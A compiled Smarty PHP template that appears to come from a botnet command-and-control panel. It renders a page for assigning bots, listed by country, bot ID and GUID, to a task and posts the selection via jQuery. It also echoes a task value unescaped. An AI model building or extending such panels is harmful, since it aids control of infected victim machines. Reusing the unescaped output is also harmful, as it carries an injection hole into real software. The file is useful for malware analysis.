<?php /* Smarty version Smarty-3.0.6, created on 2011-02-22 01:24:38
         compiled from "/var/www/maincp/client/templates/add_bots.tpl" */ ?>
<?php /*%%SmartyHeaderCode:18556306684d631056f27153-05160354%%*/if(!defined('SMARTY_DIR')) exit('no direct access allowed');
$_smarty_tpl->decodeProperties(array (
  'file_dependency' => 
  array (
    '8a953022eee24f3d98f192e637f2ffb44feac38b' => 
    array (
      0 => '/var/www/maincp/client/templates/add_bots.tpl',
      1 => 1298245251,
      2 => 'file',
    ),
  ),
  'nocache_hash' => '18556306684d631056f27153-05160354',
  'function' => 
  array (
  ),
  'has_nocache_code' => false,
)); /*/%%SmartyHeaderCode%%*/?>
<?php if (isset($_smarty_tpl->getVariable('TASK',null,true,false)->value)){?>
<h1>Add bots to task #<?php echo $_smarty_tpl->getVariable('TASK')->value;?>
</h1>
<br>
<a id='lnk_add_bots' href='javascript:void();'>Select favorite bots</a><br><br>
<form id='frm_addbots'>
<table style="border: 1px solid lightgray; font-size: 9px; border-collapse: collapse; background-color: rgb(255, 255, 240); width:700px;" border="1" cellpadding="3" cellspacing="0" id='bots_table'>
<th style='width:30px;'>#</th><th style='width:40px;'>Country</th><th style='width:40px;'>BOT ID</th><th>GUID</th><th style='width:20px;'></th>

<tr><td colspan='5' align='center'><b>There are no selected bots! Using all bots!</b></td></tr>
</table>
<input type='hidden' value='<?php echo $_smarty_tpl->getVariable('TASK')->value;?>
' name='task'>
<hr color="#dddddd" size="1">
<center><input type='submit' value='Save'></center>
</form>
<?php }?>


<script>
$('#lnk_add_bots').click(function() { LoadPopup('./mod/get_bots.php?task=<?php echo $_smarty_tpl->getVariable('TASK')->value;?>
', 'Add bots to task', 700); });


$("#frm_addbots").submit(function() 
{
	pdata = $('#frm_addbots').serialize(true);
	alert(pdata);
    $.post('./mod/task_addbots.php', pdata, function(data) { $("#page_content").html(data); });
    return false;
});
$('#lnk_add_bots').click();
</script>
